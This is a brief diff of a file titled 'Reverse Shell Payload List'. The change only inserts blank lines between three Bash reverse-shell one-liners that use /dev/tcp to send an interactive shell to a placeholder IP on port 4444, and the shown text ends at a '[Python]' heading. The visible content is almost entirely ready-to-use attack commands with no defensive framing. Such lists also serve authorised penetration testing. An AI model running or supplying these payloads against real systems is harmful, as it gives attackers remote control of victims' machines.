@@ -1,8 +1,11 @@
 Reverse Shell Payload List
 
 [Bash]
+
 bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
+
 /bin/bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
+
 bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'
 
 [Python]
